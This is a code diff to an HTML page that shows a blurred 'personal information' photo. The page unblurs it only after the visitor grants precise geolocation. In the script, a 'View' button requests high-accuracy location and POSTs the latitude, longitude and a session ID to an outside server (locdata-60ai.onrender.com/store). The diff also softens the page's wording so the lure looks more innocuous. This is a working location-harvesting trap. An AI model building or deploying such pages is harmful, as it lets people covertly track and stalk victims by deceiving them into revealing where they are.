@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Sensitive Data</title>
+  <title>Profile</title>
   <style>
     body {
       font-family: -apple-system, Roboto, sans-serif;
@@ -11,27 +11,23 @@
       padding: 20px;
       background: #f7f7f7;
     }
-
     .img-wrapper {
       display: inline-block;
       position: relative;
       max-width: 100%;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
     }
-
     .img-wrapper img {
       width: 100%;
       max-width: 500px;
       border-radius: 12px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.2);
-      filter: blur(25px); /* Strong blur */
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.2);
+      filter: blur(25px);
       transition: filter 0.6s ease;
     }
-
     .img-wrapper img.clear {
       filter: none;
     }
-
     .overlay-lock {
       position: absolute;
       top: 0;
@@ -48,19 +44,53 @@
       font-weight: bold;
       pointer-events: none;
       transition: opacity 0.5s ease;
+      text-align: center;
+      padding: 10px;
     }
-
     .img-wrapper.unlocked .overlay-lock {
       opacity: 0;
       pointer-events: none;
     }
-
+    #viewBtn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 10px;
+      padding: 10px 22px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    #viewBtn:hover:not(:disabled) {
+      background-color: #0056b3;
+    }
+    #viewBtn:disabled {
+      background-color: #999;
+      cursor: not-allowed;
+    }
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid #fff;
+      border-top: 2px solid transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
     #msg {
-      margin-top: 12px;
+      margin-top: 15px;
       font-size: 15px;
       color: #333;
     }
-
     #coord {
       margin-top: 8px;
       font-size: 14px;
@@ -69,16 +99,17 @@
   </style>
 </head>
 <body>
-  <h3>🔒 Secured Sensitive Data</h3>
-
+  <h3>Secured Data</h3>
   <div id="imgContainer" class="img-wrapper">
     <img id="photo" src="user.jpg" alt="Secure image" />
-    <div class="overlay-lock">🔒 Person Information   (Warning Don't share this Personal Details with Anyone)</div>
+    <div class="overlay-lock">
+      🔒 Person Information<br />(Don't share this personal data with anyone)
+    </div>
   </div>
-
-  <!-- Added missing msg div here -->
+  <div>
+    <button id="viewBtn">View</button>
+  </div>
   <div id="msg"></div>
-
   <div id="coord"></div>
 
   <script>
@@ -86,53 +117,82 @@
     const img = new URLSearchParams(location.search).get('img');
     const photo = document.getElementById('photo');
     const container = document.getElementById('imgContainer');
+    const viewBtn = document.getElementById('viewBtn');
+    const msgElem = document.getElementById('msg');
 
     if (img) photo.src = img;
 
-    const msg = txt => document.getElementById('msg').innerText = txt;
+    const msg = txt => msgElem.innerText = txt;
 
     const showCoords = (lat, lon, acc) => {
       document.getElementById('coord').innerHTML =
         `Lat: <strong>${lat}</strong>, Lon: <strong>${lon}</strong><br/>Accuracy: ±${acc} meters`;
     };
 
-    window.addEventListener('DOMContentLoaded', () => {
+    const showSpinner = () => {
+      viewBtn.disabled = true;
+      viewBtn.innerHTML = `<div class="spinner"></div> Loading...`;
+    };
+
+    const resetButton = () => {
+      viewBtn.disabled = false;
+      viewBtn.innerHTML = 'View';
+    };
+
+    const handleViewClick = () => {
       if (!navigator.geolocation) {
-        msg('❌ Geolocation is not supported by your browser.');
+        msg('Location is not supported by your browser.');
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(async pos => {
-        const lat = pos.coords.latitude.toFixed(6);
-        const lon = pos.coords.longitude.toFixed(6);
-        const acc = Math.round(pos.coords.accuracy);
+      showSpinner();
+      msg('Requesting permission to View...');
 
-        showCoords(lat, lon, acc);
-        
+      navigator.geolocation.getCurrentPosition(
+        async pos => {
+          const lat = pos.coords.latitude.toFixed(6);
+          const lon = pos.coords.longitude.toFixed(6);
+          const acc = Math.round(pos.coords.accuracy);
 
-        try {
-          const res = await fetch('https://locdata-60ai.onrender.com/store', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId, lat, lon, accuracy_m: acc })
-          });
-          
-        } catch {
-          msg('⚠️ Network error while sharing location.');
+          showCoords(lat, lon, acc);
+          msg('View Access Granted');
+
+          try {
+            await fetch('https://locdata-60ai.onrender.com/store', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                sessionId,
+                lat,
+                lon,
+                accuracy_m: acc
+              })
+            });
+          } catch {
+            msg('Could not send data to server.');
+          }
+
+          photo.classList.add('clear');
+          container.classList.add('unlocked');
+          // Button stays disabled
+        },
+        err => {
+          msg(`❌ View access denied: ${err.message}`);
+          photo.classList.remove('clear');
+          container.classList.remove('unlocked');
+          resetButton();
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
         }
+      );
+    };
 
-        // Unblur the image & hide lock overlay
-        photo.classList.add('clear');
-        container.classList.add('unlocked');
-
-      }, err => {
-        msg(`❌ Location denied or failed: ${err.message}`);
-      }, {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0
-      });
-    });
+    viewBtn.addEventListener('click', handleViewClick);
   </script>
 </body>
 </html>
